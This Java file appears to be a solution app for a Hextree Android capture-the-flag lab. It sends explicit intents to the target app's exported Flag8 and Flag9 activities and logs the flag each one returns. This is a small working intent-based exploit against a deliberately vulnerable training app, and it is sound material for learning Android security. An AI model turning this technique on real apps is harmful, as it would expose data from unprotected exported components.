package com.poc.hextree;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;


public class HextreeActivity extends AppCompatActivity {

    public String packageName = "io.hextree.attacksurface";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_hextree);

        flag9Solution();
    }

    private void flag9Solution(){
//        this expects a results hence OnActivity result must be different
        Intent intent = new Intent();
        intent.setClassName(packageName,packageName+".activities.Flag9Activity");
        startActivityForResult(intent,42);

    }

    private void flag8Solution() {
//        onActivty result for this is empty as it doesnt send a result back to us.
        Intent intent = new Intent();
        intent.setClassName(packageName,packageName+".activities.Flag8Activity");
        startActivityForResult(intent,42);
    }

    //    @SuppressLint("MissingSuperCall")
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        Log.i("activity result", Utils.dumpIntent(this,data));
        if (resultCode == RESULT_OK && data != null) {
            // Retrieve the flag data from the returned intent
            String flag = data.getStringExtra("flag");
            Log.d("FlagResult", "Received flag: " + flag);
        }
            super.onActivityResult(requestCode, resultCode, data);
    }
}